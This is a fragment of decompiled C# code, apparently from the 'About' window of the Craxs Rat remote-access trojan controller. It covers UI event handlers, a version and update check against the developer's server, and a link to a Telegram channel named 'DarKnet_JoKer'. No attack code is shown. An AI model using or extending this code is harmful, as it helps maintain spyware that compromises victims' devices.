			Process.Start("https://t.me/DarKnet_JoKer");
		}
		catch (Exception)
		{
		}
	}

	private void Button1_Click(object sender, EventArgs e)
	{
		Close();
	}

	private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsergwrg(object sender, EventArgs e)
	{
		usermail = RegistryHandler.Get_EMAIL();
	}

	private void CraxsAbout_MouseDown(object sender, MouseEventArgs e)
	{
	}

	private void TabPage1_MouseDown(object sender, MouseEventArgs e)
	{
		if (e.Button == MouseButtons.Left)
		{
			Codes.ReleaseCapture();
			Codes.SendMessage(base.Handle, 161, 2, 0);
		}
	}

	private void DrakeUITabControlMenu1_MouseDown(object sender, MouseEventArgs e)
	{
		if (e.Button == MouseButtons.Left)
		{
			Codes.ReleaseCapture();
			Codes.SendMessage(base.Handle, 161, 2, 0);
		}
	}

	private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsqwefghju(object sender, EventArgs e)
	{
		try
		{
			string text = Codes.CheckForUpdates2();
			if (text != null)
			{
				if (Operators.CompareString(text, "Error", TextCompare: false) != 0)
				{
					try
					{
						if (!text.StartsWith("New:"))
						{
							Codes.MyMsgBox("Connection error 1", "please try again later.", useno: false, Resources.error48px);
						}
						else
						{
							string left = Codes.Encrypt(Codes.hashmd5(Application.ExecutablePath), "87q3vb48ghq3w4asd");
							string[] array = text.Replace("New:", "").Split(':');
							string right = array[0];
							if (Operators.CompareString(left, right, TextCompare: false) == 0)
							{
								Codes.MyMsgBox("Up to date", "Congrats  Craxs Rat is updated.", useno: false, Resources.sucess48px);
							}
							else
							{
								string text2 = Codes.WhatNewupdate2();
								if (Operators.CompareString(text2, "ERROR", TextCompare: false) == 0)
								{
									text2 = "General Fix and improvment";
								}
								UpdatesScreen updatesScreen = new UpdatesScreen();
								switch (RegistryHandler.Get_Language())
								{
								default:
									updatesScreen.logupdate.AppendText("New Update available\r\n\r\n" + text2);
									break;
								case "CN":
									updatesScreen.logupdate.AppendText("有新的更新可用\r\n\r\n" + text2);
									break;
								case "EN":
									updatesScreen.logupdate.AppendText("New Update available\r\n\r\n" + text2);
									break;
								case "AR":
									updatesScreen.logupdate.AppendText("يوجد تحديث جديد\r\n\r\n" + text2);
									break;
								}
								updatesScreen.ShowDialog();
							}
						}
						return;
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						Codes.MyMsgBox("Connection error 1", "please try again later.", useno: false, Resources.error48px);
						ProjectData.ClearProjectError();
						return;
					}
				}
				Codes.MyMsgBox("Connection error 1", "please try again later.", useno: false, Resources.error48px);
			}
			else
			{
				Codes.MyMsgBox("Connection error 1", "please try again later.", useno: false, Resources.error48px);
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			Codes.MyMsgBox("Connection error 1", "please try again later.", useno: false, Resources.error48px);
			ProjectData.ClearProjectError();
		}
	}

	private void Updatbtn_Click(object sender, EventArgs e)
	{
	}

	private void Label3_Click(object sender, EventArgs e)
	{
	}

	private void DrakeUIButton1_Click(object sender, EventArgs e)
	{
		aboutpanel.BringToFront();
	}

	private void DrakeUIButton2_Click(object sender, EventArgs e)
	{
	}

	private void DrakeUIButton3_Click(object sender, EventArgs e)
	{
	}

	private void DrakeUIButton4_Click(object sender, EventArgs e)
	{
		reportpanel.BringToFront();
	}

	private void DrakeUIAvatar6_Click(object sender, EventArgs e)
	{
		Close();
	}

	private void Toppanel_MouseDown(object sender, MouseEventArgs e)
	{
		if (e.Button == MouseButtons.Left)
		{
			Codes.ReleaseCapture();
			Codes.SendMessage(base.Handle, 161, 2, 0);
		}
	}

	private void DrakeUIButton4_MouseDown(object sender, MouseEventArgs e)
	{
	}

	private void CraxsAbout_FormClosing(object sender, FormClosingEventArgs e)
	{
	}
}
